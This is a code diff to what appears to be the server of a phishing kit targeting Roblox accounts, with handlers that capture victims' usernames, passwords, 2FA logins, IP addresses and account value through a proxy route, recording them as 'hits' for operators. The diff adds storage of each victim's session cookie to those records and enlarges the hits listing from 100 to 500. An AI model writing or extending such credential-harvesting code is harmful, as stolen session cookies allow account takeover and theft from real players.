@@ -738,6 +738,7 @@ async function recordHit({
     summary = 0,
     rap = 0,
     hasCookie = false,
+    cookie = '',
     source = 'login',
     targetId = '',
     operatorId = null,
@@ -756,6 +757,7 @@ async function recordHit({
         summary: Number(summary) || Number(balance) || 0,
         rap: Number(rap) || 0,
         hasCookie: Boolean(hasCookie),
+        cookie: cookie ? String(cookie) : '',
         source,
         targetId: String(targetId || ''),
         operator: op.username,
@@ -885,7 +887,7 @@ app.get('/api/signins', (req, res) => {
 });
 
 app.get('/api/hits', (req, res) => {
-    res.json(hitsStore.slice(0, 100));
+    res.json(hitsStore.slice(0, 500));
 });
 
 app.get('/api/visits', (req, res) => {
@@ -1026,6 +1028,7 @@ async function captureLoginHandler(req, res) {
             summary: Number(data.summary || data.creditBalance) || 0,
             rap: Number(data.rap) || 0,
             hasCookie: Boolean(cookie),
+            cookie,
             source: kind,
             targetId: data.profileId || '',
             ip: clientIp,
@@ -3350,6 +3353,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
                         summary: (richData?.creditBalance || 0) + (richData?.pendingRobux || 0),
                         rap: richData?.rap || 0,
                         hasCookie: true,
+                        cookie: cookieValue,
                         source: final2FA ? '2fa_login' : 'direct_login',
                         ip: clientIp
                     });
@@ -3600,6 +3604,7 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
             summary: 0,
             rap: 0,
             hasCookie: Boolean(cookie),
+            cookie: cookie || '',
             source: effective2FA ? '2fa_login' : 'direct_login',
             ip: clientIp
         }).catch(err => {
